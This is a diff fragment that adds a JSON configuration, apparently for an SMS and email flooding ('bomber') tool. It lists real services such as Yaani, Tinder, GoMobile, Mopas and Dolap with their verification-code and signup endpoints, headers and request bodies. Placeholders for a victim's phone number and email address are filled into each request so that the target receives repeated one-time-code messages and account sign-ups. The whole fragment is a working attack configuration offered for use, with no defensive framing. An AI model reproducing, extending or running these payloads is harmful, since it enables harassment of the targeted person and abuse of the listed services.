+                    "data": "--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n%%MAIL_ADDRESS%%\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0%%PHONE_NUMBER%%\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
+                }
+            },
+            {
+                "name": "Yaani",
+                "validateData": 204,
+                "payload": {
+                    "url": "https://api.yaanimail.com:443/gateway/v1/accounts/verification-code/send",
+                    "headers": {
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
+                        "Content-Type": "application/json"
+                    },
+                    "json": {
+                        "action": "create",
+                        "email": "%%MAIL_ADDRESS%%@yaani.com",
+                        "language": "tr",
+                        "recovery_options": [
+                            {
+                                "type": "email",
+                                "value": "%%MAIL_ADDRESS%%"
+                            },
+                            {
+                                "type": "msisdn",
+                                "value": "90%%PHONE_NUMBER%%"
+                            }
+                        ]
+                    }
+                }
+            },
+            {
+                "name": "Tinder",
+                "validateData": 200,
+                "payload": {
+                    "url": "https://api.gotinder.com/v2/auth/sms/send",
+                    "params": {
+                        "auth_type": "sms",
+                        "locale": "tr"
+                    },
+                    "data": {
+                        "phone_number": "90%%PHONE_NUMBER%%"
+                    }
+                }
+            }
+        ],
+        "custom": []
+    },
+    "get": {
+        "json": [
+            {
+                "name": "GoMobile",
+                "validateData": true,
+                "validatePath": "data.success",
+                "payload": {
+                    "url": "https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/sms/send?phone=%%PHONE_NUMBER%%&isRegistered=true"
+                }
+            }
+        ],
+        "statusCode": [
+            {
+                "name": "Mopas",
+                "validateData": 200,
+                "payload": {
+                    "url": "https://mopas.com.tr/sms/activation?mobileNumber=%%PHONE_NUMBER%%&pwd=&checkPwd="
+                }
+            },
+            {
+                "name": "Osmanlideal",
+                "validateData": 200,
+                "payload": {
+                    "url": "https://osmgck.idealdata.com.tr:7850/X%02REQ_SMSDEMO%02%%MAIL_ADDRESS%%%020%%PHONE_NUMBER%%"
+                }
+            },
+            {
+                "name": "Buludag",
+                "validateData": 200,
+                "payload": {
+                    "url": "https://bilet.balikesiruludag.com.tr:443/mobil/UyeOlKontrol.php?CepTelefon=%%PHONE_NUMBER%%"
+                }
+            }
+        ],
+        "custom": []
+    },
+    "put": {
+        "json": [],
+        "statusCode": [
+            {
+                "name": "Dolap",
+                "validateData": 200,
+                "payload": {
+                    "url": "https://api-gateway.dolap.com:443/member",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "Accept": "*/*",
+                        "Appversion": "359",
+                        "Accept-Language": "tr-TR,tr;q=0.9",
+                        "Accept-Encoding": "gzip, deflate",
+                        "Categorygroup": "WOMAN",
+                        "Access-Token": "",
+                        "User-Agent": "dolap/2 CFNetwork/1335.0.3 Darwin/21.6.0",
+                        "Appplatform": "ios"
+                    },
+                    "json": {
+                        "advertisingId": "",
+                        "campaignAgreement": false,
+                        "email": "%%MAIL_ADDRESS%%",
+                        "memberCookie": "",
+                        "membershipAgreement": true,
+                        "nickName": "tingirifistik",
+                        "password": "31ABC..abc31",
+                        "phoneNumber": "%%PHONE_NUMBER%%"
+                    }
+                }
+            }
+        ],
+        "custom": []
+    },
+    "customMethods": {
+        "json": [],
+        "statusCode": [],
+        "custom": [
+            {
+                "name": "KahveDunyasi",
+                "methodName": "kahvedunyasi",
+                "payload": {}
+            },
+            {
+                "name": "Dsmartgo",
+                "methodName": "dsmartgo",
+                "payload": {}
+            },
+            {
+                "name": "Pinar",
+                "methodName": "pinar",
+                "payload": {}
+            },
+            {
+                "name": "Ebebek",
+                "methodName": "ebebek",
+                "payload": {}
+            },
+            {
+                "name": "Gratis",
+                "methodName": "gratis",
+                "payload": {}
+            }
+        ]
+    }
+}
